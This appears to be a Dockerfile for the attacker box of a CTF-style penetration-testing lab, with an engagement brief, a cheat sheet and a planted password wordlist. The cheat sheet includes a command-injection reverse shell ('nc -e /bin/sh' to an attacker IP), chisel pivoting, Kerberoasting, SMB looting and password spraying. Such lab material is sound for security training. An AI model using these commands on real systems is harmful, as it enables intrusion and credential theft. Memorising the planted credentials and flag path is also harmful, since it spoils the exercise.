FROM debian:12-slim

ENV DEBIAN_FRONTEND=noninteractive

# Install core pentesting packages
RUN apt-get update && apt-get install -y --no-install-recommends \
    bash \
    curl \
    wget \
    nmap \
    netcat-openbsd \
    dnsutils \
    socat \
    python3 \
    python3-pip \
    python3-venv \
    smbclient \
    tcpdump \
    traceroute \
    iputils-ping \
    iproute2 \
    net-tools \
    openssh-client \
    proxychains4 \
    hydra \
    john \
    gobuster \
    masscan \
    ldap-utils \
    postgresql-client \
    vim \
    less \
    jq \
    git \
    file \
    procps \
    && rm -rf /var/lib/apt/lists/*

# Install Impacket (full suite) into system Python
RUN python3 -m pip install --break-system-packages --no-cache-dir \
    impacket \
    bloodhound \
    ldap3 \
    dnspython \
    requests \
    colorama \
    pycryptodome

# Install chisel (HTTP tunnel for pivoting — key tool)
RUN wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz \
    -O /tmp/chisel.gz && \
    gunzip /tmp/chisel.gz && \
    mv /tmp/chisel /usr/local/bin/chisel && \
    chmod +x /usr/local/bin/chisel

# Create symlinks for impacket tools so they work directly in shell (no venv activation needed)
RUN for script in \
    GetNPUsers.py \
    GetUserSPNs.py \
    GetADUsers.py \
    smbclient.py \
    secretsdump.py \
    psexec.py \
    wmiexec.py \
    smbexec.py \
    atexec.py \
    lookupsid.py \
    samrdump.py \
    rpcdump.py \
    ifmap.py \
    reg.py \
    services.py \
    netview.py \
    addcomputer.py \
    ticketer.py \
    getST.py \
    getTGT.py; do \
    if [ -f /usr/local/bin/$script ]; then \
        chmod +x /usr/local/bin/$script; \
    fi; \
done

# Custom proxychains4 config for pivoting
RUN echo "[ProxyList]" > /etc/proxychains4.conf && \
    echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Professional engagement workspace
WORKDIR /root/pentest_workspace

# Seed structured engagement brief and cheat-sheet
RUN cat > /root/pentest_workspace/ENGAGEMENT_BRIEF.txt << 'EOF'
╔══════════════════════════════════════════════════════════════════╗
║         NEXUS GLOBAL ENTERPRISE — PENETRATION TEST              ║
║         Authorized Red Team Assessment — 2026-08-16             ║
╚══════════════════════════════════════════════════════════════════╝

CLIENT:    Nexus Global Logistics & Enterprise Systems
SCOPE:     Full-scope internal & external assessment
DURATION:  5 Days (TOCTOU window)

TARGET PERIMETER:
  External Gateway:  198.51.100.10  (WAF/Nginx Reverse Proxy)
  Mail Server:       10.0.1.30      (Port 8025 - Webmail UI)
  SSH Bastion:       10.0.1.40      (Port 22  - Jump Host)

OBJECTIVES (in order):
  [1] External recon & service fingerprinting
  [2] Gain initial foothold on DMZ (any service)
  [3] Pivot from DMZ to Core Backbone (10.0.2.0/24)
  [4] Enumerate Active Directory domain (nexus.internal)
  [5] Retrieve Data Center Crown Jewels (Flags)

CTF FLAG FORMAT: FLAG{...}
EOF

RUN cat > /root/pentest_workspace/CHEATSHEET.txt << 'EOF'
═══════════════════════════════════════════════
   NEXUS LAB — QUICK PENTEST CHEATSHEET
═══════════════════════════════════════════════

1. RECON
   nmap -sS -sV -p 80,443,22,8025,445 198.51.100.10
   nmap -sS -sV --script=banner 198.51.100.10
   curl -I http://198.51.100.10/
   curl http://198.51.100.10/robots.txt
   curl http://198.51.100.10/changelog.txt

2. WEB APP ATTACK (DMZ)
   gobuster dir -u http://198.51.100.10 -w /usr/share/wordlists/dirb/common.txt
   sqlmap -u "http://198.51.100.10/?track_id=NX-1234" --dbs

3. COMMAND INJECTION (Ping Diagnostic Tool)
   curl -X POST http://198.51.100.10/api/network/ping \
     -d "host=127.0.0.1; id; whoami"
   # Reverse Shell:
   curl -X POST http://198.51.100.10/api/network/ping \
     -d "host=127.0.0.1; nc -e /bin/sh 198.51.100.100 4444"

4. PIVOTING
   # Start chisel server (on attacker):
   chisel server --port 8888 --reverse &
   # On compromised DMZ host via cmd injection:
   chisel client 198.51.100.100:8888 R:1080:socks

   # Then use proxychains for all internal scanning:
   proxychains4 nmap -sT -Pn 10.0.2.10

5. ACTIVE DIRECTORY ENUMERATION
   smbclient -L //10.0.2.10 -N
   smbclient //10.0.2.10/IT-Backups -N
   ldapsearch -x -H ldap://10.0.2.10 -b "dc=nexus,dc=internal"
   GetNPUsers.py nexus.internal/ -no-pass -dc-ip 10.0.2.10
   GetUserSPNs.py nexus.internal/tahmed:DevOpsP@ss2026! -dc-ip 10.0.2.10

6. PRIVILEGE ESCALATION & CREDENTIAL LEAKS
   # Read IT-Backups share:
   smbclient //10.0.2.10/IT-Backups -N -c "get sync_prod_db.sh; get INFRA_RUNBOOK.txt"
   cat sync_prod_db.sh   # Contains DB credentials

7. DATA CENTER ACCESS
   # PostgreSQL:
   psql -h 10.0.3.20 -U nexus_admin -d nexus_prod -W
   # Inside DB:
   \dt
   SELECT * FROM system_vault_keys;
   SELECT * FROM employees;

8. BASTION SSH (Gray-Box Entry)
   ssh devops-remote@10.0.1.40
   # Default SSH pass spray: Winter2026! / Nexus@2026 / devops-remote@123

═══════════════════════════════════════════════
EOF

# Create a wordlist directory for brute-forcing
RUN mkdir -p /root/wordlists && \
    printf 'admin\nnexus\npassword\n123456\nadmin123\nNexus@2026\nWinter2026!\nDevOpsP@ss2026!\nNexusTechAdmin2026!\ndevops-remote@123\nHrDirector9921!\nNexusCISO_Mv@2026#\n' \
    > /root/wordlists/nexus-passwords.txt

CMD ["bash", "--login"]
